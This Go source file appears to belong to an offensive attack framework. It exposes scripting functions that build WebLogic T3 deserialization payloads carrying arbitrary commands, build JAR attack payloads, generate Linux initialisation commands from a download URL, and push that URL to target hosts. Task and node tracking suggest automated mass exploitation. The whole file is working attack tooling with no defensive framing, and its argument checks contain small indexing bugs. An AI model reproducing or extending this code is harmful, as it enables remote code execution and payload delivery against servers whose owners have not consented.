package ascript

import (
	"fmt"
	"github.com/cbot/attack"
	"github.com/cbot/attack/weblogic"
	"github.com/cbot/proto/http"
	"github.com/cbot/proto/transport"
	"github.com/cbot/targets/source"
	"github.com/d5/tengo/objects"
	"github.com/d5/tengo/script"
	"github.com/d5/tengo/stdlib"
	"github.com/d5/tengo/v2"
	"io/ioutil"
	"strings"
)

type AttackScript struct {
	attack.TengoObj

	attackTasks *attack.AttackTasks

	name string

	attackType string

	defaultPort int

	defaultProto string

	/*tengo script instanse Compiled*/
	attackTengo *script.Compiled
}

/*compile tengo script*/
func scriptCompile(sdata []byte) (*script.Compiled, error) {

	script := script.New(sdata)

	script.Add("attackScript", nil)
	script.Add("attackTarget",nil)

	mm := objects.NewModuleMap()

	/*add all stdlibs*/
	builtinMaps := objects.NewModuleMap()
	for name, im := range stdlib.BuiltinModules {
		builtinMaps.AddBuiltinModule(name, im)
	}

	mm.AddMap(builtinMaps)
	mm.Add("attack", AttackScript{})
	mm.Add("http", http.HttpTengo{})
	mm.Add("transport",transport.TransportTengo{})

	script.SetImports(mm)

	return script.Compile()

}

/*Create an attack script  by script content*/
func NewAttackScriptFromContent(attackTasks *attack.AttackTasks,
	name string,
	attackType string,
	defaultPort int,
	defaultProto string,
	data []byte) (*AttackScript, error) {

	com, err := scriptCompile(data)

	if err != nil {

		return nil, err
	}

	return &AttackScript{
		TengoObj:     attack.TengoObj{Name: name},
		attackTasks:  attackTasks,
		name:         name,
		attackType:   attackType,
		defaultPort:  defaultPort,
		defaultProto: defaultProto,
		attackTengo:  com,
	}, nil

}

/*create an attack script  by file*/
func NewAttackScriptFromFile(attackTasks *attack.AttackTasks,
	name string,
	attackType string,
	defaultPort int,
	defaultProto string, fname string) (*AttackScript, error) {

	data, err := ioutil.ReadFile(fname)

	if err != nil {
		return nil, err
	}

	return NewAttackScriptFromContent(attackTasks, name, attackType, defaultPort, defaultProto, data)

}

func (as *AttackScript) Name() string {

	return as.name
}

func (as *AttackScript) DefaultPort() int {

	return as.defaultPort
}

func (as *AttackScript) DefaultProto() string {

	return as.defaultProto
}

func (as *AttackScript) Accept(target source.Target) bool {

	types := target.Source().GetTypes()

	for _, t := range types {

		if strings.EqualFold(t, as.attackType) {

			return true
		}
	}

	return false
}

func (as *AttackScript) Run(target source.Target) error {

	defer as.attackTasks.PubUnSyn()

	attackTarget := newAttackTarget(as, target)

	ts := as.attackTengo.Clone()

	ts.Set("attackTarget", attackTarget)
	ts.Set("attackScript", as)

	if err := ts.Run(); err != nil {

		return err

	}

	return nil
}

func (as *AttackScript) PubProcess(process *attack.AttackProcess) {

	as.attackTasks.PubAttackProcess(process)

}

func newAttackProcess(args ...objects.Object) (ret objects.Object, err error) {

	return &attack.AttackProcess{

		TengoObj: attack.TengoObj{Name: "AttackProcess"},
		IP:       "",
		Host:     "",
		Port:     0,
		App:      "",
		OS:       "",
		Name:     "",
		Type:     "",
		Status:   0,
		Payload:  "",
		Result:   "",
	}, nil

}

func (as *AttackScript) MakeWeblogicT3Payload(args ...objects.Object) (ret objects.Object, err error) {

	if len(args) != 2 {

		return nil, tengo.ErrWrongNumArguments
	}

	cmd, ok := objects.ToString(args[0])
	if !ok {
		return nil, tengo.ErrInvalidArgumentType{
			Name:     "cmd",
			Expected: "string(compatible)",
			Found:    args[0].TypeName(),
		}
	}

	version, ok := objects.ToString(args[1])
	if !ok {
		return nil, tengo.ErrInvalidArgumentType{
			Name:     "version",
			Expected: "string(compatible)",
			Found:    args[0].TypeName(),
		}
	}

	pload,_ := weblogic.MakeWeblogicPayload(cmd,version)

	return objects.FromInterface(pload)
}

func (as *AttackScript) MakeJarAttackPayload(args ...objects.Object) (ret objects.Object, err error) {

	if len(args) != 1 {

		return nil, tengo.ErrWrongNumArguments
	}

	cmd, ok := objects.ToString(args[0])
	if !ok {
		return nil, tengo.ErrInvalidArgumentType{
			Name:     "targetIP",
			Expected: "string(compatible)",
			Found:    args[0].TypeName(),
		}
	}

	fpath,_:= as.attackTasks.MakeJarAttackPayload(cmd)

	return objects.FromInterface(fpath)
}

func (as *AttackScript) InitCmdForLinux(args ...objects.Object) (ret objects.Object, err error) {

	if len(args) != 2 {

		return nil, tengo.ErrWrongNumArguments
	}

	initUrl, ok := objects.ToString(args[0])
	if !ok {
		return nil, tengo.ErrInvalidArgumentType{
			Name:     "initUrl",
			Expected: "string(compatible)",
			Found:    args[0].TypeName(),
		}
	}

	attackType, ok := objects.ToString(args[1])
	if !ok {
		return nil, tengo.ErrInvalidArgumentType{
			Name:     "attackType",
			Expected: "string(compatible)",
			Found:    args[1].TypeName(),
		}
	}

	return objects.FromInterface(as.attackTasks.InitCmdForLinux(initUrl,attackType))
}

func (as *AttackScript) DownloadInitURL(args ...objects.Object) (ret objects.Object, err error) {

	if len(args) != 3 {

		return nil, tengo.ErrWrongNumArguments
	}

	targetIP, ok := objects.ToString(args[0])
	if !ok {
		return nil, tengo.ErrInvalidArgumentType{
			Name:     "targetIP",
			Expected: "string(compatible)",
			Found:    args[0].TypeName(),
		}
	}

	targetPort, ok := objects.ToInt(args[1])
	if !ok {
		return nil, tengo.ErrInvalidArgumentType{
			Name:     "targetPort",
			Expected: "int(compatible)",
			Found:    args[1].TypeName(),
		}
	}

	fname, ok := objects.ToString(args[2])
	if !ok {
		return nil, tengo.ErrInvalidArgumentType{
			Name:     "attackType",
			Expected: "string(compatible)",
			Found:    args[3].TypeName(),
		}
	}

	return objects.FromInterface(as.attackTasks.DownloadInitUrl(targetIP, targetPort, as.attackType, fname))

}

func (as *AttackScript) GetTaskId(args ...objects.Object) (ret objects.Object, err error) {

	return objects.FromInterface(as.attackTasks.GetTaskId())
}

func (as *AttackScript) GetNodeId(args ...objects.Object) (ret objects.Object, err error) {

	return objects.FromInterface(as.attackTasks.GetNodeId())
}

func (as *AttackScript) IndexGet(index objects.Object) (value objects.Object, err error) {

	key, ok := objects.ToString(index)

	if !ok {
		return nil, tengo.ErrInvalidArgumentType{
			Name:     "index",
			Expected: "string(compatible)",
			Found:    index.TypeName(),
		}
	}

	switch key {

	case "pubProcess":

		return &AttackScriptMethod{
			TengoObj: attack.TengoObj{Name: "pubProcess"},
			as:       as,
		}, nil

	case "downloadInitUrl":

		return &AttackScriptMethod{
			TengoObj: attack.TengoObj{Name: "downloadInitUrl"},
			as:       as,
		}, nil

	case "initCmdForLinux":

		return &AttackScriptMethod{
			TengoObj: attack.TengoObj{Name: "initCmdForLinux"},
			as:       as,
		}, nil

	case "makeJarAttackPayload":

		return &AttackScriptMethod{
			TengoObj: attack.TengoObj{Name: "makeJarAttackPayload"},
			as:       as,
		}, nil

	case "getTaskId":

		return &AttackScriptMethod{
			TengoObj: attack.TengoObj{Name: "getTaskId"},
			as:       as,
		}, nil

	case "getNodeId":

		return &AttackScriptMethod{
			TengoObj: attack.TengoObj{Name: "getNodeId"},
			as:       as,
		}, nil

	case "makeWeblogicT3Payload":

		return &AttackScriptMethod{
			TengoObj: attack.TengoObj{Name: "makeWeblogicT3Payload"},
			as:       as,
		}, nil
	}

	return nil, fmt.Errorf("Unknown Attack script method:%s", key)
}

type AttackScriptMethod struct {
	attack.TengoObj

	as *AttackScript
}

func (m *AttackScriptMethod) Call(args ...objects.Object) (objects.Object, error) {

	switch m.Name {

	case "pubProcess":
		ap := args[0].(*attack.AttackProcess)
		m.as.PubProcess(ap)

		return m.as, nil

	case "downloadInitUrl":
		return m.as.DownloadInitURL(args...)

	case "initCmdForLinux":
		return m.as.InitCmdForLinux(args...)

	case "makeJarAttackPayload":

		return m.as.MakeJarAttackPayload(args...)

	case "getTaskId":
		return m.as.GetTaskId(args ...)

	case "getNodeId":
		return m.as.GetNodeId(args ...)

	case "makeWeblogicT3Payload":
		return m.as.MakeWeblogicT3Payload(args...)

	}

	return m.as, nil
}

var moduleMap objects.Object = &objects.ImmutableMap{

	Value: map[string]objects.Object{

		"newAttackProcess": &objects.UserFunction{
			Name:  "new_attack_process",
			Value: newAttackProcess,
		},
	},
}

func (AttackScript) Import(moduleName string) (interface{}, error) {

	switch moduleName {
	case "attack":
		return moduleMap, nil
	default:
		return nil, fmt.Errorf("undefined module %q", moduleName)
	}
}
